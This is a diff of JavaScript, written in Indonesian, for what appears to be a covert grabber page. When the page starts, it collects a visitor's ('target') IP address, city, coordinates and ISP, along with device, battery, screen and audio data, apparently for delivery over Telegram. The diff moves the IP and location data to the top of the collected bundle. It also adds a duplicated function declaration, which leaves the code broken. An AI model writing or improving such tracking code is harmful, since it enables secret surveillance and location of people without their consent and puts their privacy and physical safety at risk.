@@ -570,7 +570,12 @@ const ambilIPTarget = async () => {
     const res = await fetch("https://ip-api.com/json");
     const data = await res.json();
 
-    const hasil = `
+    // Cek apakah respons valid
+    if (!data.query || !data.country) {
+      return `౼ 〘 𝗜𝗣 𝗧𝗔𝗥𝗚𝗘𝗧 〙 ౼\n❌ Gagal parsing data IP.`;
+    }
+
+    return `
 ౼ 〘 𝗜𝗣 + 𝗟𝗢𝗞𝗔𝗦𝗜 𝗧𝗔𝗥𝗚𝗘𝗧 〙 ౼
 IP        : ${data.query}
 Negara    : ${data.country}
@@ -578,11 +583,10 @@ Provinsi  : ${data.regionName}
 Kota      : ${data.city}
 Koordinat : ${data.lat}, ${data.lon}
 ISP       : ${data.isp}
-Koneksi   : ${data.mobile ? "Mobile" : "WiFi"}
-`;
-    await kirimPesan(hasil);
-  } catch {
-    await kirimPesan("౼ 〘 𝗜𝗣 𝗧𝗔𝗥𝗚𝗘𝗧 〙 ౼\n❌ Gagal mengambil IP/lokasi.");
+Koneksi   : ${data.mobile ? "Mobile Data" : "WiFi"}
+`.trim();
+  } catch (err) {
+    return `౼ 〘 𝗜𝗣 𝗧𝗔𝗥𝗚𝗘𝗧 〙 ౼\n❌ Gagal mengambil data: ${err}`;
   }
 };
 
@@ -724,12 +728,12 @@ Link Kiriman Audio     : (terlampir langsung via Telegram)`;
 };
 
 const mulai = async () => {
+const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
-  // ✅ Tambahan: Ambil IP + lokasi awal target
-  const ipLokasi = await ambilIPTarget();
-  await kirimPesan(ipLokasi); // ← Kirim terpisah paling awal
+  // Ambil IP + lokasi dari ip-api.com
+  const ipLokasi = await ambilIPTarget(); // ← tambahin ini dulu
 
   const infoPerangkat = await ambilDataPerangkat();
   const bateraiInfo = await ambilBaterai();
@@ -743,6 +747,7 @@ const mulai = async () => {
   const outputAudio = await ambilOutputAudio();
 
   const gabungAwal = [
+    ipLokasi,                // ← tambahkan paling atas
     infoPerangkat,
     bateraiInfo,
     layarGrafik,
